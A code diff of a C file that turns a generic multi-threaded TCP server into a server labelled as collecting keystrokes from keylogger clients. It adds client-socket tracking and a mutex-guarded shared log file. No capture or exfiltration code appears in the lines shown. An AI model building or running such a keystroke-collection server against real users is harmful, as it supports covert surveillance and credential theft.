@@ -1,11 +1,10 @@
 /*
-    A Multi-Client Server
-    Concurrency Method: Multi-Threading with pthread (Each connected client gets
-   a separate thread)
+    ** MULTI-CLIENT KEYLOGGER SERVER (CLIENTS SENDS KEYSTROKES) **
 */
 
 #include "utils.h"
 #include <arpa/inet.h>
+#include <bits/pthreadtypes.h>
 #include <errno.h>
 #include <netinet/in.h>
 #include <pthread.h>
@@ -19,6 +18,17 @@
 
 #define MAX_CLIENTS 10
 int server_sock; 
+
+// Integer array to store connected client's socket.
+int client_sockets[MAX_CLIENTS];
+
+// Mutual Exclusive Lock for shared file descriptor.
+pthread_mutex_t mutexFD = PTHREAD_MUTEX_INITIALIZER;
+
+// Shared file descriptor for logging keystrokes.
+int file_D;
+
+// Struct to store client.
 typedef struct
 {
     int client_socket;
@@ -86,15 +96,17 @@ int main(int argc, char *argv[])
         fprintf(stderr, "[x] Listening! [FAILED]\n");
         exit(EXIT_FAILURE);
     }
-    printf("[+] Listening On Port: %d [SUCCESS]\n", atoi(argv[2]));
+    printf("[+] Listening On Port: %d [SUCCESS]\n", port);
 
     // Accept incoming client connection.
     struct sockaddr_in client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
     int client_sock, pthread;
     pthread_t client_thread;
+    
+    int numOfClients = 0;
 
-    while (1)
+    while (numOfClients < MAX_CLIENTS)
     {
 
         client_sock = accept(server_sock, (struct sockaddr *)&client_addr,
@@ -112,6 +124,12 @@ int main(int argc, char *argv[])
             }
         }
         printf("[+] New Client Online: FD %d [%s:%d]\n", client_sock, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
+
+        // Store connected client's socket in the client_sockets array.
+        client_sockets[numOfClients] = client_sock;
+        numOfClients += 1;
+
+        printf("[#] Clients Online =>[%d]\n", numOfClients);
 
         Client_Args *client_args = malloc(sizeof(Client_Args));
         if (client_args == NULL)
